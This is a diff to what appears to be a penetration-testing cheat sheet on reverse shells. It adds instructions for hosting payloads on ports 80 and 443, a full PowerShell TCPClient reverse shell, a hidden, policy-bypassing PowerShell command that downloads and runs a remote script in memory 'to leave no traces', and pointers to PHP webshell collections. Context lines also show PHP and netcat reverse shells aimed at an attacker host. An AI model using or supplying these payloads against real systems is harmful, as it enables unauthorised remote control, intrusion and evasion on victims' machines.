@@ -2,6 +2,23 @@
 
 * Try always using ports: 80 or 443 if open
 
+# Serving
+
+To upload malicious reverse shell code it is necessary to host this code
+
+Try using ports 80 and 443 for this reason.
+
+```
+python -m SimpleHTTPServer 443
+python3 -m http.server 443
+
+php -S 0.0.0.0:443
+
+ruby -run -e httpd . -p 443
+
+busybox httpd -f -p 443
+```
+
 # Reverse shells
 
 All of those methods assume that necessary programs like nc, python, php and etc are installed on target hosts.
@@ -32,15 +49,18 @@ nc.exe <IP> <PORT> -e cmd.exe
 This script is tested on most windows machines and should work fine.
 
 ```
-#replace <IP_VICTIM> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)
+#replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)
 
-$client = New-Object System.Net.Sockets.TCPClient('<IP_VICTIM>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
+$client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
+
 launch on target
 ```
 
 Launch the above script directly or save on local attacking maching and call it from powershell like that to execute in memory and leave no traces
 
-`powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
+`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
+
+`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
 
 ## Python
 
@@ -53,6 +73,27 @@ Launch the above script directly or save on local attacking maching and call it 
 ```
 php -r '$sock=fsockopen("ATTACKER-IP",ATTACKER-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+```
+
+### PHP webshells
+
+Nice collection here: https://github.com/JohnTroony/php-webshells
+
+I TAKE ABSOLUTELY NO RESPONSIBILITY FOR ANY OF THOSE SHELLS. CHECK their CODE BEFORE USING!
+THE ONLY SAFE SHELL is within kali linux webshells.
+
+```
+$ webshells
+> webshells ~ Collection of webshells
+/usr/share/webshells
+├── asp
+├── aspx
+├── cfm
+├── jsp
+├── laudanum -> /usr/share/laudanum
+├── perl
+└── php
+
 ```
 
 ## Socat
